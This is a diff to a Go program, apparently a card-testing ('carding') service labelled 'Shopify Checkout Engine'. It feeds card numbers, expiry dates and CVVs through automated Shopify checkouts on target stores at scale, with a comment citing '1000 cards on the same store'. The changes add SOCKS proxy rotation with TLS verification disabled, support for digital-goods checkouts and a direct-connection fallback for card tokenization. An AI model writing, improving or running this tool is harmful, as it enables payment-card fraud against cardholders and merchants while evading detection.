@@ -9,6 +9,7 @@ import (
 	"io"
 	"log"
 	"math/rand"
+	"net"
 	"net/http"
 	"net/http/cookiejar"
 	"net/url"
@@ -19,6 +20,8 @@ import (
 	"sync"
 	"sync/atomic"
 	"time"
+
+	"golang.org/x/net/proxy"
 )
 
 // ==========================================
@@ -143,10 +146,11 @@ var startTime = time.Now()
 // ==========================================
 
 type variantEntry struct {
-	ID       string
-	Price    float64
-	Currency string
-	Expiry   time.Time
+	ID               string
+	Price            float64
+	Currency         string
+	RequiresShipping bool
+	Expiry           time.Time
 }
 
 type tokenEntry struct {
@@ -165,25 +169,26 @@ var (
 	deadStores   sync.Map // baseURL -> deadEntry
 )
 
-func cacheLookupVariant(baseURL string) (string, float64, string, bool) {
+func cacheLookupVariant(baseURL string) (string, float64, string, bool, bool) {
 	v, ok := variantCache.Load(baseURL)
 	if !ok {
-		return "", 0, "", false
+		return "", 0, "", false, false
 	}
 	e := v.(variantEntry)
 	if time.Now().After(e.Expiry) {
 		variantCache.Delete(baseURL)
-		return "", 0, "", false
+		return "", 0, "", false, false
 	}
-	return e.ID, e.Price, e.Currency, true
+	return e.ID, e.Price, e.Currency, e.RequiresShipping, true
 }
 
-func cacheStoreVariant(baseURL, id string, price float64, currency string) {
+func cacheStoreVariant(baseURL, id string, price float64, currency string, requiresShipping bool) {
 	variantCache.Store(baseURL, variantEntry{
-		ID:       id,
-		Price:    price,
-		Currency: currency,
-		Expiry:   time.Now().Add(VARIANT_CACHE_TTL),
+		ID:               id,
+		Price:            price,
+		Currency:         currency,
+		RequiresShipping: requiresShipping,
+		Expiry:           time.Now().Add(VARIANT_CACHE_TTL),
 	})
 }
 
@@ -265,15 +270,15 @@ func init() {
 }
 
 // getProxyClient returns a client with a FRESH cookie jar per call to prevent
-// session bleeding across concurrent goroutines. The underlying Transport is
-// shared so connection pooling is preserved for the non-proxy path.
+// session bleeding across concurrent goroutines. HTTP(S) proxies use
+// http.Transport.Proxy; SOCKS4/5 proxies use golang.org/x/net/proxy dialer.
 func getProxyClient(proxyStr string) (*http.Client, error) {
 	jar, _ := cookiejar.New(nil)
 
 	if proxyStr == "" {
 		return &http.Client{
 			Jar:       jar,
-			Transport: GlobalClient.Transport, // shared transport (connection reuse)
+			Transport: GlobalClient.Transport,
 			Timeout:   HTTP_TIMEOUT,
 		}, nil
 	}
@@ -282,6 +287,37 @@ func getProxyClient(proxyStr string) (*http.Client, error) {
 	if err != nil || proxyURL == nil {
 		return nil, fmt.Errorf("invalid proxy format")
 	}
+
+	scheme := strings.ToLower(proxyURL.Scheme)
+
+	if scheme == "socks5" || scheme == "socks4" || scheme == "socks" {
+		var auth *proxy.Auth
+		if proxyURL.User != nil {
+			password, _ := proxyURL.User.Password()
+			auth = &proxy.Auth{
+				User:     proxyURL.User.Username(),
+				Password: password,
+			}
+		}
+		host := proxyURL.Host
+		dialer, err := proxy.SOCKS5("tcp", host, auth, proxy.Direct)
+		if err != nil {
+			return nil, fmt.Errorf("socks5 dialer error: %v", err)
+		}
+		transport := &http.Transport{
+			DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+				return dialer.Dial(network, addr)
+			},
+			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
+			DisableCompression: true,
+		}
+		return &http.Client{
+			Jar:       jar,
+			Transport: transport,
+			Timeout:   HTTP_TIMEOUT,
+		}, nil
+	}
+
 	return &http.Client{
 		Jar: jar,
 		Transport: &http.Transport{
@@ -589,7 +625,7 @@ func rejectNeedsTermAccept(codes []string) bool {
 
 const VARIANT_FETCH_QUERY = `query{products(first:50){edges{node{variants(first:50){edges{node{id availableForSale requiresShipping price{amount currencyCode}}}}}}}}`
 
-func fetchVariant(ctx context.Context, client *http.Client, baseURL string) (string, float64, string, error) {
+func fetchVariant(ctx context.Context, client *http.Client, baseURL string) (string, float64, string, bool, error) {
 	reVid := regexp.MustCompile(`ProductVariant/(\d+)`)
 	tokenRe := regexp.MustCompile(`(?i)(?:storefrontAccessToken|accessToken)["']?\s*[:=]\s*["']([a-f0-9]{32})`)
 
@@ -651,10 +687,10 @@ func fetchVariant(ctx context.Context, client *http.Client, baseURL string) (str
 		return nil
 	}
 
-	pick := func(data []byte) (string, float64, string, bool) {
+	pick := func(data []byte) (string, float64, string, bool, bool) {
 		var r gqlResp
 		if err := json.Unmarshal(data, &r); err != nil || r.Data == nil || r.Data.Products == nil {
-			return "", 0, "", false
+			return "", 0, "", false, false
 		}
 		type candidate struct {
 			id       string
@@ -693,7 +729,7 @@ func fetchVariant(ctx context.Context, client *http.Client, baseURL string) (str
 			}
 		}
 		if len(candidates) == 0 {
-			return "", 0, "", false
+			return "", 0, "", false, false
 		}
 		best := candidates[0]
 		for _, c := range candidates[1:] {
@@ -703,12 +739,12 @@ func fetchVariant(ctx context.Context, client *http.Client, baseURL string) (str
 				best = c
 			}
 		}
-		return best.id, best.price, best.currency, true
+		return best.id, best.price, best.currency, best.shipping, true
 	}
 
 	if body := fetch(""); body != nil {
-		if id, price, cur, ok := pick(body); ok {
-			return id, price, cur, nil
+		if id, price, cur, shipping, ok := pick(body); ok {
+			return id, price, cur, shipping, nil
 		}
 	}
 
@@ -730,28 +766,28 @@ func fetchVariant(ctx context.Context, client *http.Client, baseURL string) (str
 	}
 	if homeToken != "" {
 		if body := fetch(homeToken); body != nil {
-			if id, price, cur, ok := pick(body); ok {
-				return id, price, cur, nil
+			if id, price, cur, shipping, ok := pick(body); ok {
+				return id, price, cur, shipping, nil
 			}
 		}
 	}
 
-	return "", 0, "", fmt.Errorf("no valid paid variant found")
+	return "", 0, "", false, fmt.Errorf("no valid paid variant found")
 }
 
 // fetchVariantCached wraps fetchVariant with a 10-minute per-store cache.
 // This is the biggest performance win: 1000 cards on the same store = 1 fetch.
-func fetchVariantCached(ctx context.Context, client *http.Client, baseURL string) (string, float64, string, error) {
-	if id, price, cur, ok := cacheLookupVariant(baseURL); ok {
+func fetchVariantCached(ctx context.Context, client *http.Client, baseURL string) (string, float64, string, bool, error) {
+	if id, price, cur, shipping, ok := cacheLookupVariant(baseURL); ok {
 		log.Printf("[CACHE HIT] variant for %s", baseURL)
-		return id, price, cur, nil
+		return id, price, cur, shipping, nil
 	}
-	id, price, cur, err := fetchVariant(ctx, client, baseURL)
+	id, price, cur, shipping, err := fetchVariant(ctx, client, baseURL)
 	if err != nil {
-		return "", 0, "", err
+		return "", 0, "", false, err
 	}
-	cacheStoreVariant(baseURL, id, price, cur)
-	return id, price, cur, nil
+	cacheStoreVariant(baseURL, id, price, cur, shipping)
+	return id, price, cur, shipping, nil
 }
 
 // ==========================================
@@ -866,8 +902,11 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 	}
 
 	// ✅ AUTO-FETCH VARIANT IF NOT PROVIDED (with per-store cache)
+	// Default to true so externally supplied variant IDs assume physical goods
+	// (preserves legacy behavior when requiresShipping is unknown).
+	requiresShipping := true
 	if variantID == "" {
-		vid, price, cur, err := fetchVariantCached(ctx, client, baseURL)
+		vid, price, cur, shipping, err := fetchVariantCached(ctx, client, baseURL)
 		if err != nil {
 			res.Message = fmt.Sprintf("Auto-variant failed: %v", err)
 			return res
@@ -875,7 +914,8 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 		variantID = vid
 		res.Price = price
 		res.Currency = cur
-		log.Printf("[AUTO] Found variant %s ($%.2f %s) for %s", vid, price, cur, baseURL)
+		requiresShipping = shipping
+		log.Printf("[AUTO] Found variant %s ($%.2f %s, shipping=%v) for %s", vid, price, cur, shipping, baseURL)
 	}
 
 	// Address: prefer currency-based (accurate), fall back to URL-based.
@@ -1028,13 +1068,14 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 		},
 	}
 
-	variables := map[string]interface{}{
-		"sessionInput": map[string]string{"sessionToken": sst},
-		"queueToken":   queueToken,
-
-		"delivery": map[string]interface{}{
+	// Delivery terms: SHIPPING for physical goods, noDeliveryRequired for digital.
+	var deliveryVars map[string]interface{}
+	if requiresShipping {
+		deliveryVars = map[string]interface{}{
 			"deliveryLines": []map[string]interface{}{{
-				"destination": map[string]interface{}{"partialStreetAddress": billingAddr["streetAddress"]},
+				"destination": map[string]interface{}{
+					"partialStreetAddress": billingAddr["streetAddress"],
+				},
 				"selectedDeliveryStrategy": map[string]interface{}{
 					"deliveryStrategyMatchingConditions": map[string]interface{}{
 						"estimatedTimeInTransit": map[string]interface{}{"any": true},
@@ -1048,7 +1089,23 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 				"destinationChanged":     true,
 			}},
 			"noDeliveryRequired": []interface{}{},
-		},
+		}
+	} else {
+		deliveryVars = map[string]interface{}{
+			"deliveryLines": []interface{}{},
+			"noDeliveryRequired": []map[string]interface{}{
+				{"stableId": stableID},
+			},
+			"useProgressiveRates":   false,
+			"supportsSplitShipping": true,
+		}
+	}
+
+	variables := map[string]interface{}{
+		"sessionInput": map[string]string{"sessionToken": sst},
+		"queueToken":   queueToken,
+
+		"delivery": deliveryVars,
 		"merchandise": map[string]interface{}{
 			"merchandiseLines": []map[string]interface{}{{
 				"stableId": stableID,
@@ -1218,8 +1275,8 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 	scriptFP := fastExtract(body, "scriptFingerprint")
 	transformerFP := fstr(body, "transformerFingerprintV2")
 
-	// Step 4: Confirm Delivery
-	if deliveryStrategy != "" {
+	// Step 4: Confirm Delivery (physical goods only)
+	if requiresShipping && deliveryStrategy != "" {
 		variables["delivery"].(map[string]interface{})["deliveryLines"].([]map[string]interface{})[0]["selectedDeliveryStrategy"] = map[string]interface{}{
 			"deliveryStrategyByHandle": map[string]interface{}{"handle": deliveryStrategy, "customDeliveryRate": false},
 			"options":                  map[string]string{},
@@ -1280,7 +1337,7 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 	}
 
 	refreshProposal := func() {
-		if deliveryStrategy != "" {
+		if requiresShipping && deliveryStrategy != "" {
 			if dl, ok := variables["delivery"].(map[string]interface{}); ok {
 				if lines, ok := dl["deliveryLines"].([]map[string]interface{}); ok && len(lines) > 0 {
 					lines[0]["selectedDeliveryStrategy"] = map[string]interface{}{
@@ -1343,7 +1400,7 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 			}
 		}
 	}
-	if deliveryStrategy == "" {
+	if requiresShipping && deliveryStrategy == "" {
 		needRateWait = true
 	}
 	if eta := fstr(fastExtract(body, "delivery"), "progressiveRatesEstimatedTimeUntilCompletion"); eta != "" {
@@ -1358,21 +1415,23 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 		delay := minInt(maxInt(rateDelayMs, 400), 2000)
 		time.Sleep(time.Duration(delay) * time.Millisecond)
 		refreshProposal()
-		if deliveryStrategy == "" {
+		if requiresShipping && deliveryStrategy == "" {
 			delay2 := minInt(maxInt(rateDelayMs, 800), 2500)
 			time.Sleep(time.Duration(delay2) * time.Millisecond)
 			refreshProposal()
 		}
 	}
 
-	// Step 5: PCI Tokenization
+	// Step 5: PCI Tokenization with proxy fallback
 	pciPayload, _ := json.Marshal(map[string]interface{}{
 		"credit_card": map[string]interface{}{
-			"number": cc, "month": mes, "year": ano, "verification_value": cvv,
-			"name": fmt.Sprintf("%s %s", fName, lName),
+			"number": cc, "month": mes, "year": ano,
+			"verification_value": cvv,
+			"name":               fmt.Sprintf("%s %s", fName, lName),
 		},
 		"payment_session_scope": u.Host,
 	})
+
 	pciHeaders := map[string]string{
 		"Content-Type": "application/json",
 		"Accept":       "application/json",
@@ -1384,12 +1443,25 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 		pciHeaders["shopify-identification-signature"] = identSig
 	}
 
+	pciToken := ""
+
+	// First attempt: use existing proxy client
 	body, _, err = doReq(ctx, client, "POST", pciURL, pciHeaders, bytes.NewReader(pciPayload))
-	if err != nil {
-		res.Message = "PCI_TOKEN_FAILED"
-		return res
+	if err == nil {
+		pciToken = fstr(body, "id")
 	}
-	pciToken := fstr(body, "id")
+
+	// Fallback: if proxy blocked PCI domain, retry without proxy
+	if pciToken == "" && proxyStr != "" {
+		directClient, cerr := getProxyClient("")
+		if cerr == nil {
+			body, _, err = doReq(ctx, directClient, "POST", pciURL, pciHeaders, bytes.NewReader(pciPayload))
+			if err == nil {
+				pciToken = fstr(body, "id")
+			}
+		}
+	}
+
 	if pciToken == "" {
 		res.Message = "PCI_TOKEN_FAILED"
 		return res
@@ -1403,22 +1475,6 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 			"queueToken":     queueToken,
 			"checkpointData": checkpointData,
 			"discounts":      map[string]interface{}{"lines": []interface{}{}, "acceptUnexpectedDiscounts": true},
-			"delivery": map[string]interface{}{
-				"deliveryLines": []map[string]interface{}{{
-					"destination": map[string]interface{}{"streetAddress": billingAddr["streetAddress"]},
-					"selectedDeliveryStrategy": map[string]interface{}{
-						"deliveryStrategyByHandle": map[string]interface{}{"handle": deliveryStrategy, "customDeliveryRate": false},
-						"options":                  map[string]string{"phone": phone},
-					},
-					"targetMerchandiseLines": map[string]interface{}{"lines": []map[string]string{{"stableId": stableID}}},
-					"deliveryMethodTypes":    []string{"SHIPPING"},
-					"expectedTotalPrice":     map[string]interface{}{"any": true},
-					"destinationChanged":     false,
-				}},
-				"noDeliveryRequired":    []interface{}{},
-				"useProgressiveRates":   true,
-				"supportsSplitShipping": true,
-			},
 			"deliveryExpectations": map[string]interface{}{
 				"deliveryExpectationLines": func() []map[string]string {
 					if signedHandle != "" {
@@ -1451,6 +1507,45 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 		"attemptToken": submitAttemptToken,
 		"analytics":    map[string]string{"requestUrl": checkoutURL},
 	}
+
+	if requiresShipping {
+		submitVars["input"].(map[string]interface{})["delivery"] = map[string]interface{}{
+			"deliveryLines": []map[string]interface{}{{
+				"destination": map[string]interface{}{
+					"streetAddress": billingAddr["streetAddress"],
+				},
+				"selectedDeliveryStrategy": map[string]interface{}{
+					"deliveryStrategyByHandle": map[string]interface{}{
+						"handle":             deliveryStrategy,
+						"customDeliveryRate": false,
+					},
+					"options": map[string]string{"phone": phone},
+				},
+				"targetMerchandiseLines": map[string]interface{}{
+					"lines": []map[string]string{{"stableId": stableID}},
+				},
+				"deliveryMethodTypes":    []string{"SHIPPING"},
+				"expectedTotalPrice":     map[string]interface{}{"any": true},
+				"destinationChanged":     false,
+			}},
+			"noDeliveryRequired":    []interface{}{},
+			"useProgressiveRates":   true,
+			"supportsSplitShipping": true,
+		}
+	} else {
+		submitVars["input"].(map[string]interface{})["delivery"] = map[string]interface{}{
+			"deliveryLines": []interface{}{},
+			"noDeliveryRequired": []map[string]interface{}{
+				{"stableId": stableID},
+			},
+			"useProgressiveRates":   false,
+			"supportsSplitShipping": true,
+		}
+		submitVars["input"].(map[string]interface{})["deliveryExpectations"] = map[string]interface{}{
+			"deliveryExpectationLines": []interface{}{},
+		}
+	}
+
 	if scriptFP != nil {
 		var sfm map[string]interface{}
 		if json.Unmarshal(scriptFP, &sfm) == nil {
@@ -1921,7 +2016,7 @@ func validateHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	vid, price, cur, err := fetchVariantCached(ctx, client, baseURL)
+	vid, price, cur, _, err := fetchVariantCached(ctx, client, baseURL)
 	if err != nil {
 		_ = json.NewEncoder(w).Encode(map[string]interface{}{"valid": false, "error": "no_variant"})
 		return
@@ -2051,7 +2146,7 @@ func main() {
 	}
 
 	log.Printf("🚀 Shopify Checkout Engine starting on port %s\n", port)
-	log.Printf("⚡ Auto-Variant | Zero Dependencies | %d Concurrent | 1GB RAM Optimized\n", GLOBAL_MAX_CONCURRENT)
+	log.Printf("⚡ Auto-Variant | SOCKS + HTTP Proxies | %d Concurrent | 1GB RAM Optimized\n", GLOBAL_MAX_CONCURRENT)
 	if err := server.ListenAndServe(); err != nil {
 		log.Fatalf("Server crashed: %v", err)
 	}
